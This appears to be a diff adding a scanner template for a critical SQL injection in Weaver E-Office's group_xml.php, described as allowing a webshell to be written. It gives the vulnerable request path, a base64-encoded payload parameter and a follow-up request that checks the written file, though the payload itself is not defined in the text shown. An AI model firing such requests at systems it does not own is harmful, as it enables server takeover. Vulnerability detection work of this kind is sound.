@@ -1,0 +1,39 @@
+id: weaver-group-xml-sqli
+brief:
+    title: OA E-Office group_xml.php - SQL Injection
+    by: SleepingBag945
+    level: critical
+    about: There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php file. Through the vulnerability, an attacker can write to the Webshell file to obtain server permissions.
+    label:
+        - weaver
+        - e-office
+        - oa
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/inc/group_user_list/group_xml.php?par={{base64(payload)}}'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{filename}}.php'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
